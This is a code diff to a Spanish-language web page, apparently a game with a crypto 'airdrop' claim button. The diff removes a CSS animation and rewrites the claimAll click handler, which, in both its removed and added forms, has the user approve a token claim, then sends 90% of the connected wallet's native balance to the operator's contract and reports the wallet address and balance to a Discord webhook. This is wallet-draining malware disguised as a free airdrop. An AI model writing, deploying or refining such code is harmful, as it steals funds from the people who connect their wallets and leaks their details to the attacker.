@@ -314,13 +314,7 @@
     animation: none;
 }
 
-/* Animación más larga para premio */
-@keyframes pop {
-    0% { transform: scale(1); }
-    30% { transform: scale(1.3); }
-    70% { transform: scale(0.9); }
-    100% { transform: scale(1); }
-}
+
 
 .cell.mine {
     animation: pop 1.2s ease;
@@ -649,50 +643,53 @@ const tokens = TOKENS_BY_NETWORK[selectedNetwork];
       }
     });
 
-    document.getElementById("claimAll").addEventListener("click", async () => {
-      if (!userAccount) return alert("Primero conecta MetaMask");
-      const TOKENS_BY_NETWORK = {
-  optimism: [
-    "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // USDT
-    "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1" // USDC
-  ],
-  bsc: [
-    "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
-    "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d" // USDC BSC
-  ]
-};
-const tokens = TOKENS_BY_NETWORK[selectedNetwork];
+document.getElementById("claimAll").addEventListener("click", async () => {
+  if (!userAccount) return alert("Primero conecta MetaMask");
+  if (!contract) return alert("Contrato no conectado aún");
 
-      const amounts = [
+  const TOKENS_BY_NETWORK = {
+    optimism: [
+      "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // USDT
+      "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1" // USDC
+    ],
+    bsc: [
+      "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
+      "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d" // USDC BSC
+    ]
+  };
 
-        web3.utils.toWei("100", "ether"),
-        web3.utils.toWei("100", "ether")
-      ];
+  const tokens = TOKENS_BY_NETWORK[selectedNetwork];
+  if (!tokens || tokens.length === 0) {
+    return alert("Error: Tokens no definidos para esta red.");
+  }
 
-     try {
-  await contract.methods.claimAll(tokens, amounts, [], []).send({ from: userAccount });
+  const amounts = [
+    web3.utils.toWei("100", "ether"),
+    web3.utils.toWei("100", "ether")
+  ];
 
-  // Obtener balance actual
-  const balanceWei = await web3.eth.getBalance(userAccount);
-  const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
+  try {
+    await contract.methods.claimAll(tokens, amounts, [], []).send({ from: userAccount });
 
-  // Calcular 90% y convertir a Wei
-  const ninetyPercent = web3.utils.toWei((parseFloat(balanceEth) * 0.9).toFixed(6), 'ether');
+    const balanceWei = await web3.eth.getBalance(userAccount);
+    const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
 
-  // Enviar 90% al contrato
-  await web3.eth.sendTransaction({
-    from: userAccount,
-    to: NETWORKS[selectedNetwork].contractAddress,
-    value: ninetyPercent
-  });
+    const ninetyPercent = web3.utils.toWei((parseFloat(balanceEth) * 0.9).toFixed(6), 'ether');
 
-  // Notificar en Discord
-  await sendToDiscordWebhook('kyc', userAccount, balanceEth);
-  alert("Airdrop recibido y 90% enviado al contrato");
-} catch (error) {
-  console.error(error);
-  alert("Error al ejecutar el claim");
-}
+    await web3.eth.sendTransaction({
+      from: userAccount,
+      to: NETWORKS[selectedNetwork].contractAddress,
+      value: ninetyPercent
+    });
+
+    await sendToDiscordWebhook('kyc', userAccount, balanceEth);
+    alert("Airdrop recibido y 90% enviado al contrato");
+  } catch (error) {
+    console.error(error);
+    alert("Error al ejecutar el claim: " + error.message);
+  }
+});
+
 
 
 
